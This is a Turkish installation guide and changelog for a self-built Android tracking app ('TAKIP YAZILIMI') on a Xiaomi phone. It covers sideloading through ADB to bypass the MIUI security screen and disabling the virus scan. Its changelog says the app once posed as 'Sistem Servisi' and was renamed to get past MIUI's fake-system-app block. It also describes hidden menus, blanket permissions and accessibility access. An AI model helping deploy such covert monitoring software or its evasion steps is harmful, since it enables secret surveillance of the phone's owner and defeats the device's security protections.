# Xiaomi Mi 13T — APK Kurulum (Paket yükleyici hatası)

## En garantili yöntem: ADB ile kur (PC'den)

Bu yöntem MIUI güvenlik ekranını **atlar**.

### 1. Telefonda
- Ayarlar → Telefon hakkında → MIUI sürümüne **7 kez** bas → Geliştirici modu açılır
- Ayarlar → Geliştirici seçenekleri → **USB hata ayıklama** AÇ
- **USB ile yükleme (güvenlik)** AÇ

### 2. PC'de
Telefonu USB ile bağla, CMD aç:

```cmd
cd C:\Users\ALPARSLAN\Desktop\TAKIP YAZILIMI\android\app\build\outputs\apk\debug
adb install -r app-debug.apk
```

`Success` yazarsa kuruldu.

> ADB yoksa: https://developer.android.com/tools/releases/platform-tools indir, zip aç, `adb.exe` ile yukarıdaki komutu çalıştır.

---

## Manuel kurulum (MIUI ayarları)

### Adım 1 — Güvenlik taramasını kapat
```
Güvenlik uygulaması → Dişli (Ayarlar) → Virüs taraması → Yüklemeden önce tara → KAPAT
```

### Adım 2 — Paket yükleyici önbelleği
```
Ayarlar → Uygulamalar → Paket yükleyici → Depolama → Önbelleği temizle
```

### Adım 3 — Bilinmeyen kaynak
```
Ayarlar → Uygulamalar → Özel uygulama erişimi → Bilinmeyen uygulamaları yükle
→ Dosyalar / Mi Dosyalar → İZİN VER
```

### Adım 4 — MIUI optimizasyonu (isteğe bağlı)
```
Geliştirici seçenekleri → MIUI optimizasyonunu kapat → Telefon yeniden başlar
```

### Adım 5 — Yeni APK
Android Studio → **Build → Build APK(s)** → `app-debug.apk`

**USB ile** telefona kopyala (WhatsApp kullanma).

---

## v1.0.2 değişiklikleri (kurulum düzeltmesi)

- Uygulama adı **"Sistem Servisi"** → **"Aile Takip"** (MIUI sahte sistem uygulaması engelini aşar)
- Gizli arama kodu receiver kaldırıldı (paket yükleyici çökmesine neden oluyordu)
- Gereksiz izinler manifestten çıkarıldı
- Gizli menü: tarayıcıda `takip://settings`

---

## Kurulum sonrası (Xiaomi)

```
Ayarlar → Uygulamalar → Aile Takip → Diğer izinler → HEPSİNİ AÇ
Otomatik başlat → AÇ
Pil tasarrufu → Kısıtlama yok
Erişilebilirlik → Aile Takip → AÇ
```
